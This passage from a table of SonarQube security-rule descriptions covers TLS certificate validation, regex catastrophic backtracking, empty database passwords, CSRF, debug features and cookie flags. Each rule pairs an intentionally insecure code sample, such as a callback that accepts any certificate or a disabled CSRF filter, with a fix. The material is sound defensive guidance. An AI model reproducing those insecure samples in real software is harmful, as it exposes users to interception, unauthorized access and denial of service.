  <li> Set the <code>secure</code> flag to <em>true</em> for session-cookies. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>Flask</p>
<pre>
from flask import Response

@app.route('/')
def index():
    response = Response()
    response.set_cookie('key', 'value') # Sensitive
    return response
</pre>
<h2>Compliant Solution</h2>
<p>Flask</p>
<pre>
from flask import Response

@app.route('/')
def index():
    response = Response()
    response.set_cookie('key', 'value', secure=True) # Compliant
    return response
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/315">CWE-315 - Cleartext Storage of Sensitive Information in a Cookie</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/614">CWE-614 - Sensitive Cookie in HTTPS Session Without 'Secure' Attribute</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S4830">
              vbnet:S4830
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them.
Certificate validation adds an extra layer of trust and security to this process to ensure that a system is indeed the one it claims to be.</p>
<p>When certificate validation is disabled, the client skips a critical security check. This creates an opportunity for attackers to pose as a trusted
entity and intercept, manipulate, or steal the data being transmitted.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to
build this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can
exploit this by creating a fake server and masquerading as a legitimate one. For example, they might set up a server that looks like your bank’s
server, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect
any data your system sends to them, potentially leading to significant data breaches.</p>
<h4>Loss of data integrity</h4>
<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data
in transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious
code or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the
system.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>In the following example, the callback change impacts the entirety of HTTP requests made by the application.</p>
<p>The certificate validation gets disabled by overriding <code>ServerCertificateValidationCallback</code> with an empty implementation. It is highly
recommended to use the original implementation.</p>
<h4>Noncompliant code example</h4>
<pre>
Imports System.Net

Public Sub Send()
    ServicePointManager.ServerCertificateValidationCallback =
        Function(sender, certificate, chain, errors) True ' Noncompliant

    Dim request As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(New System.Uri("https://example.com"))
    request.Method = System.Net.WebRequestMethods.Http.Get
    Dim response As System.Net.HttpWebResponse = request.GetResponse()
    response.Close()
End Sub
</pre>
<h3>How does this work?</h3>
<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>
<p>To avoid running into problems with invalid certificates, consider the following sections.</p>
<h4>Using trusted certificates</h4>
<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list
of trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no
additional code or configuration.</p>
<h4>Working with self-signed certificates or non-standard CAs</h4>
<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted
roots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">Mobile Top 10 2016 Category M3 - Insecure
  Communication</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec
  Verification Standard - Network Communication Requirements</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/295">CWE-295 - Improper Certificate Validation</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S4830">
              csharpsquid:S4830
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them.
Certificate validation adds an extra layer of trust and security to this process to ensure that a system is indeed the one it claims to be.</p>
<p>When certificate validation is disabled, the client skips a critical security check. This creates an opportunity for attackers to pose as a trusted
entity and intercept, manipulate, or steal the data being transmitted.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to
build this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can
exploit this by creating a fake server and masquerading as a legitimate one. For example, they might set up a server that looks like your bank’s
server, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect
any data your system sends to them, potentially leading to significant data breaches.</p>
<h4>Loss of data integrity</h4>
<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data
in transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious
code or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the
system.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>In the following example, the callback change impacts the entirety of HTTP requests made by the application.</p>
<p>The certificate validation gets disabled by overriding <code>ServerCertificateValidationCallback</code> with an empty implementation. It is highly
recommended to use the original implementation.</p>
<h4>Noncompliant code example</h4>
<pre>
using System.Net;
using System.Net.Http;

public static void connect()
{
    ServicePointManager.ServerCertificateValidationCallback +=
	 (sender, certificate, chain, errors) =&gt; {
	     return true; // Noncompliant
    };

    HttpClient httpClient = new HttpClient();
    HttpResponseMessage response = httpClient.GetAsync("https://example.com").Result;
}
</pre>
<h3>How does this work?</h3>
<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>
<p>To avoid running into problems with invalid certificates, consider the following sections.</p>
<h4>Using trusted certificates</h4>
<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list
of trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no
additional code or configuration.</p>
<h4>Working with self-signed certificates or non-standard CAs</h4>
<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted
roots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">Mobile Top 10 2016 Category M3 - Insecure
  Communication</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec
  Verification Standard - Network Communication Requirements</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/295">CWE-295 - Improper Certificate Validation</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5852">
              java:S5852
            </a>
          </td>
          <td>
            <details>
              <p>Most of the regular expression engines use <code>backtracking</code> to try all possible execution paths of the regular expression when evaluating
an input, in some cases it can cause performance issues, called <code>catastrophic backtracking</code> situations. In the worst case, the complexity
of the regular expression is exponential in the size of the input, this means that a small carefully-crafted input (like 20 chars) can trigger
<code>catastrophic backtracking</code> and cause a denial of service of the application. Super-linear regex complexity can lead to the same impact too
with, in this case, a large carefully-crafted input (thousands chars).</p>
<p>This rule determines the runtime complexity of a regular expression and informs you of the complexity if it is not linear.</p>
<p>Note that, due to improvements to the matching algorithm, some cases of exponential runtime complexity have become impossible when run using JDK 9
or later. In such cases, an issue will only be reported if the project’s target Java version is 8 or earlier.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The input is user-controlled. </li>
  <li> The input size is not restricted to a small number of characters. </li>
  <li> There is no timeout in place to limit the regex evaluation time. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>To avoid <code>catastrophic backtracking</code> situations, make sure that none of the following conditions apply to your regular expression.</p>
<p>In all of the following cases, catastrophic backtracking can only happen if the problematic part of the regex is followed by a pattern that can
fail, causing the backtracking to actually happen. Note that when performing a full match (e.g. using <code>String.matches</code>), the end of the
regex counts as a pattern that can fail because it will only succeed when the end of the string is reached.</p>
<ul>
  <li> If you have a non-possessive repetition <code>r*</code> or <code>r*?</code>, such that the regex <code>r</code> could produce different
  possible matches (of possibly different lengths) on the same input, the worst case matching time can be exponential. This can be the case if
  <code>r</code> contains optional parts, alternations or additional repetitions (but not if the repetition is written in such a way that there’s only
  one way to match it).
    <ul>
      <li> When using JDK 9 or later an optimization applies when the repetition is greedy and the entire regex does not contain any back references.
      In that case the runtime will only be polynomial (in case of nested repetitions) or even linear (in case of alternations or optional parts).
      </li>
    </ul>  </li>
  <li> If you have multiple non-possessive repetitions that can match the same contents and are consecutive or are only separated by an optional
  separator or a separator that can be matched by both of the repetitions, the worst case matching time can be polynomial (O(n^c) where c is the
  number of problematic repetitions). For example <code>a*b*</code> is not a problem because <code>a*</code> and <code>b*</code> match different
  things and <code>a*_a*</code> is not a problem because the repetitions are separated by a <code>'_'</code> and can’t match that <code>'_'</code>.
  However, <code>a*a*</code> and <code>.*_.*</code> have quadratic runtime. </li>
  <li> If you’re performing a partial match (such as by using <code>Matcher.find</code>, <code>String.split</code>, <code>String.replaceAll</code>
  etc.) and the regex is not anchored to the beginning of the string, quadratic runtime is especially hard to avoid because whenever a match fails,
  the regex engine will try again starting at the next index. This means that any unbounded repetition (even a possessive one), if it’s followed by a
  pattern that can fail, can cause quadratic runtime on some inputs. For example <code>str.split("\\s*,")</code> will run in quadratic time on strings
  that consist entirely of spaces (or at least contain large sequences of spaces, not followed by a comma). </li>
</ul>
<p>In order to rewrite your regular expression without these patterns, consider the following strategies:</p>
<ul>
  <li> If applicable, define a maximum number of expected repetitions using the bounded quantifiers, like <code>{1,5}</code> instead of <code>+</code>
  for instance. </li>
  <li> Refactor <code>nested quantifiers</code> to limit the number of way the inner group can be matched by the outer quantifier, for instance this
  nested quantifier situation <code>(ba+)+</code> doesn’t cause performance issues, indeed, the inner group can be matched only if there exists
  exactly one <code>b</code> char per repetition of the group. </li>
  <li> Optimize regular expressions with <code>possessive quantifiers</code> and <code>atomic grouping</code>. </li>
  <li> Use negated character classes instead of <code>.</code> to exclude separators where applicable. For example the quadratic regex
  <code>.*_.*</code> can be made linear by changing it to <code>[^_]*_.*</code> </li>
</ul>
<p>Sometimes it’s not possible to rewrite the regex to be linear while still matching what you want it to match. Especially when using partial
matches, for which it is quite hard to avoid quadratic runtimes. In those cases consider the following approaches:</p>
<ul>
  <li> Solve the problem without regular expressions </li>
  <li> Use an alternative non-backtracking regex implementations such as Google’s <a href="https://github.com/google/re2">RE2</a> or <a
  href="https://github.com/google/re2j">RE2/J</a>. </li>
  <li> Use multiple passes. This could mean pre- and/or post-processing the string manually before/after applying the regular expression to it or
  using multiple regular expressions. One example of this would be to replace <code>str.split("\\s*,\\s*")</code> with <code>str.split(",")</code> and
  then trimming the spaces from the strings as a second step. </li>
  <li> When using <code>Matcher.find()</code>, it is often possible to make the regex infallible by making all the parts that could fail optional,
  which will prevent backtracking. Of course this means that you’ll accept more strings than intended, but this can be handled by using capturing
  groups to check whether the optional parts were matched or not and then ignoring the match if they weren’t. For example the regex <code>x*y</code>
  could be replaced with <code>x*(y)?</code> and then the call to <code>matcher.find()</code> could be replaced with <code>matcher.find() &amp;&amp;
  matcher.group(1) != null</code>. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>The first regex evaluation will never end in <code>JDK</code> &lt;= 9 and the second regex evaluation will never end in any versions of the
<code>JDK</code>:</p>
<pre>
java.util.regex.Pattern.compile("(a+)+").matcher(
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"+
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"+
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"+
"aaaaaaaaaaaaaaa!").matches(); // Sensitive

java.util.regex.Pattern.compile("(h|h|ih(((i|a|c|c|a|i|i|j|b|a|i|b|a|a|j))+h)ahbfhba|c|i)*").matcher(
"hchcchicihcchciiicichhcichcihcchiihichiciiiihhcchi"+
"cchhcihchcihiihciichhccciccichcichiihcchcihhicchcciicchcccihiiihhihihihi"+
"chicihhcciccchihhhcchichchciihiicihciihcccciciccicciiiiiiiiicihhhiiiihchccch"+
"chhhhiiihchihcccchhhiiiiiiiicicichicihcciciihichhhhchihciiihhiccccccciciihh"+
"ichiccchhicchicihihccichicciihcichccihhiciccccccccichhhhihihhcchchihih"+
"iihhihihihicichihiiiihhhhihhhchhichiicihhiiiiihchccccchichci").matches(); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Possessive quantifiers do not keep backtracking positions, thus can be used, if possible, to avoid performance issues:</p>
<pre>
java.util.regex.Pattern.compile("(a+)++").matcher(
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"+
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"+
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"+
"aaaaaaaaaaaaaaa!").matches(); // Compliant

java.util.regex.Pattern.compile("(h|h|ih(((i|a|c|c|a|i|i|j|b|a|i|b|a|a|j))+h)ahbfhba|c|i)*+").matcher(
"hchcchicihcchciiicichhcichcihcchiihichiciiiihhcchi"+
"cchhcihchcihiihciichhccciccichcichiihcchcihhicchcciicchcccihiiihhihihihi"+
"chicihhcciccchihhhcchichchciihiicihciihcccciciccicciiiiiiiiicihhhiiiihchccch"+
"chhhhiiihchihcccchhhiiiiiiiicicichicihcciciihichhhhchihciiihhiccccccciciihh"+
"ichiccchhicchicihihccichicciihcichccihhiciccccccccichhhhihihhcchchihih"+
"iihhihihihicichihiiiihhhhihhhchhichiicihhiiiiihchccccchichci").matches(); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/400">CWE-400 - Uncontrolled Resource Consumption</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1333">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>
  <li> <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">owasp.org</a> - OWASP Regular expression Denial
  of Service - ReDoS </li>
  <li> <a
  href="https://web.archive.org/web/20220506215733/https://stackstatus.net/post/147710624694/outage-postmortem-july-20-2016">stackstatus.net(archived)</a> - Outage Postmortem - July 20, 2016 </li>
  <li> <a href="https://www.regular-expressions.info/catastrophic.html">regular-expressions.info</a> - Runaway Regular Expressions: Catastrophic
  Backtracking </li>
  <li> <a
  href="https://docs.microsoft.com/en-us/dotnet/standard/base-types/backtracking-in-regular-expressions#backtracking-with-nested-optional-quantifiers">docs.microsoft.com</a> - Backtracking with Nested Optional Quantifiers </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S2115">
              java:S2115
            </a>
          </td>
          <td>
            <details>
              <p>When accessing a database, an empty password should be avoided as it introduces a weakness.</p>
<h2>Why is this an issue?</h2>
<p>When a database does not require a password for authentication, it allows anyone to access and manipulate the data stored within it. Exploiting
this vulnerability typically involves identifying the target database and establishing a connection to it without the need for any authentication
credentials.</p>
<h3>What is the potential impact?</h3>
<p>Once connected, an attacker can perform various malicious actions, such as viewing, modifying, or deleting sensitive information, potentially
leading to data breaches or unauthorized access to critical systems. It is crucial to address this vulnerability promptly to ensure the security and
integrity of the database and the data it contains.</p>
<h4>Unauthorized Access to Sensitive Data</h4>
<p>When a database lacks a password for authentication, it opens the door for unauthorized individuals to gain access to sensitive data. This can
include personally identifiable information (PII), financial records, intellectual property, or any other confidential information stored in the
database. Without proper access controls in place, malicious actors can exploit this vulnerability to retrieve sensitive data, potentially leading to
identity theft, financial loss, or reputational damage.</p>
<h4>Compromise of System Integrity</h4>
<p>Without a password requirement, unauthorized individuals can gain unrestricted access to a database, potentially compromising the integrity of the
entire system. Attackers can inject malicious code, alter configurations, or manipulate data within the database, leading to system malfunctions,
unauthorized system access, or even complete system compromise. This can disrupt business operations, cause financial losses, and expose the
organization to further security risks.</p>
<h4>Unwanted Modifications or Deletions</h4>
<p>The absence of a password for database access allows anyone to make modifications or deletions to the data stored within it. This poses a
significant risk, as unauthorized changes can lead to data corruption, loss of critical information, or the introduction of malicious content. For
example, an attacker could modify financial records, tamper with customer orders, or delete important files, causing severe disruptions to business
processes and potentially leading to financial and legal consequences.</p>
<p>Overall, the lack of a password configured to access a database poses a serious security risk, enabling unauthorized access, data breaches, system
compromise, and unwanted modifications or deletions. It is essential to address this vulnerability promptly to safeguard sensitive data, maintain
system integrity, and protect the organization from potential harm.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code uses an empty password to connect to a Postgres database.</p>
<p>The vulnerability can be fixed by using a strong password retrieved from Properties. This <code>database.password</code> property is set during
deployment. Its value should be strong and different for each database.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="201" data-diff-type="noncompliant">
Connection conn = DriverManager.getConnection("jdbc:derby:memory:myDB;create=true", "login", ""); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="201" data-diff-type="compliant">
String password = System.getProperty("database.password");
Connection conn = DriverManager.getConnection("jdbc:derby:memory:myDB;create=true", "login", password);
</pre>
<h3>Pitfalls</h3>
<h4>Hard-coded passwords</h4>
<p>It could be tempting to replace the empty password with a hard-coded one. Hard-coding passwords in the code can pose significant security risks.
Here are a few reasons why it is not recommended:</p>
<ol>
  <li> Security Vulnerability: Hard-coded passwords can be easily discovered by anyone who has access to the code, such as other developers or
  attackers. This can lead to unauthorized access to the database and potential data breaches. </li>
  <li> Lack of Flexibility: Hard-coded passwords make it difficult to change the password without modifying the code. If the password needs to be
  updated, it would require recompiling and redeploying the code, which can be time-consuming and error-prone. </li>
  <li> Version Control Issues: Storing passwords in code can lead to version control issues. If the code is shared or stored in a version control
  system, the password will be visible to anyone with access to the repository, which is a security risk. </li>
</ol>
<p>To mitigate these risks, it is recommended to use secure methods for storing and retrieving passwords, such as using environment variables,
configuration files, or secure key management systems. These methods allow for better security, flexibility, and separation of sensitive information
from the codebase.</p>
<h2>Resources</h2>
<ul>
  <li> <a href="https://docs.oracle.com/javase/tutorial/essential/environment/properties.html">Java Properties</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/521">CWE-521 - Weak Password Requirements</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4502">
              java:S4502
            </a>
          </td>
          <td>
            <details>
              <p>A cross-site request forgery (CSRF) attack occurs when a trusted user of a web application can be forced, by an attacker, to perform sensitive
actions that he didn’t intend, such as updating his profile or sending a message, more generally anything that can change the state of the
application.</p>
<p>The attacker can trick the user/victim to click on a link, corresponding to the privileged action, or to visit a malicious web site that embeds a
hidden web request and as web browsers automatically include cookies, the actions can be authenticated and sensitive.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The web application uses cookies to authenticate users. </li>
  <li> There exist sensitive operations in the web application that can be performed when the user is authenticated. </li>
  <li> The state / resources of the web application can be modified by doing HTTP POST or HTTP DELETE requests for example. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Protection against CSRF attacks is strongly recommended:
    <ul>
      <li> to be activated by default for all <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods">unsafe HTTP
      methods</a>. </li>
      <li> implemented, for example, with an unguessable CSRF token </li>
    </ul>  </li>
  <li> Of course all sensitive operations should not be performed with <a
  href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods">safe HTTP</a> methods like <code>GET</code> which are designed to be
  used only for information retrieval. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p><a href="https://docs.spring.io/spring-security/site/docs/5.0.x/reference/html/csrf.html#csrf-using">Spring Security</a> provides by default a
protection against CSRF attacks which can be disabled:</p>
<pre>
@EnableWebSecurity
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {

  @Override
  protected void configure(HttpSecurity http) throws Exception {
    http.csrf().disable(); // Sensitive: csrf protection is entirely disabled
   // or
    http.csrf().ignoringAntMatchers("/route/"); // Sensitive: csrf protection is disabled for specific routes
  }
}
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://docs.spring.io/spring-security/site/docs/5.0.x/reference/html/csrf.html#csrf-using">Spring Security</a> CSRF protection is enabled
by default, do not disable it:</p>
<pre>
@EnableWebSecurity
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {

  @Override
  protected void configure(HttpSecurity http) throws Exception {
    // http.csrf().disable(); // Compliant
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/352">CWE-352 - Cross-Site Request Forgery (CSRF)</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> <a href="https://owasp.org/www-community/attacks/csrf">OWASP: Cross-Site Request Forgery</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4507">
              java:S4507
            </a>
          </td>
          <td>
            <details>
              <p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during
development, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information
about the system, like the application’s path or file names.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li>
  <li> The application runs by default with debug features activated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debugging features on production servers or applications distributed to end users.</p>
<h2>Sensitive Code Example</h2>
<p><code>Throwable.printStackTrace(...)</code> prints a Throwable and its stack trace to <code>System.Err</code> (by default) which is not easily
parseable and can expose sensitive information:</p>
<pre>
try {
  /* ... */
} catch(Exception e) {
  e.printStackTrace(); // Sensitive
}
</pre>
<p><a
href="https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/config/annotation/web/configuration/EnableWebSecurity.html">EnableWebSecurity</a>
annotation for SpringFramework with <code>debug</code> to <code>true</code> enables debugging support:</p>
<pre>
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;

@Configuration
@EnableWebSecurity(debug = true) // Sensitive
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
  // ...
}
</pre>
<p><a
href="https://developer.android.com/reference/android/webkit/WebView#setWebContentsDebuggingEnabled(boolean)">WebView.setWebContentsDebuggingEnabled(true)</a>
for Android enables debugging support:</p>
<pre>
import android.webkit.WebView;

WebView.setWebContentsDebuggingEnabled(true); // Sensitive
WebView.getFactory().getStatics().setWebContentsDebuggingEnabled(true); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Loggers should be used (instead of <code>printStackTrace</code>) to print throwables:</p>
<pre>
try {
  /* ... */
} catch(Exception e) {
  LOGGER.log("context", e);
}
</pre>
<p><a
href="https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/config/annotation/web/configuration/EnableWebSecurity.html">EnableWebSecurity</a>
annotation for SpringFramework with <code>debug</code> to <code>false</code> disables debugging support:</p>
<pre>
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;

@Configuration
@EnableWebSecurity(debug = false)
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
  // ...
}
</pre>
<p><a
href="https://developer.android.com/reference/android/webkit/WebView#setWebContentsDebuggingEnabled(boolean)">WebView.setWebContentsDebuggingEnabled(false)</a>
for Android disables debugging support:</p>
<pre>
import android.webkit.WebView;

WebView.setWebContentsDebuggingEnabled(false);
WebView.getFactory().getStatics().setWebContentsDebuggingEnabled(false);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/489">CWE-489 - Active Debug Code</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/215">CWE-215 - Information Exposure Through Debug Information</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4512">
              java:S4512
            </a>
          </td>
          <td>
            <details>
              <p>Setting JavaBean properties is security sensitive. Doing it with untrusted values has led in the past to the following vulnerability:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0114">CVE-2014-0114</a> </li>
</ul>
<p>JavaBeans can have their properties or nested properties set by population functions. An attacker can leverage this feature to push into the
JavaBean malicious data that can compromise the software integrity. A typical attack will try to manipulate the ClassLoader and finally execute
malicious code.</p>
<p>This rule raises an issue when:</p>
<ul>
  <li> BeanUtils.populate(…​) or BeanUtilsBean.populate(…​) from <a href="http://commons.apache.org/proper/commons-beanutils/">Apache Commons
  BeanUtils</a> are called </li>
  <li> BeanUtils.setProperty(…​) or BeanUtilsBean.setProperty(…​) from <a href="http://commons.apache.org/proper/commons-beanutils/">Apache Commons
  BeanUtils</a> are called </li>
  <li> org.springframework.beans.BeanWrapper.setPropertyValue(…​) or org.springframework.beans.BeanWrapper.setPropertyValues(…​) from Spring is called
  </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the new property values might have been tampered with or provided by an untrusted source. </li>
  <li> sensitive properties can be modified, for example: <code>class.classLoader</code> </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Sanitize all values used as JavaBean properties.</p>
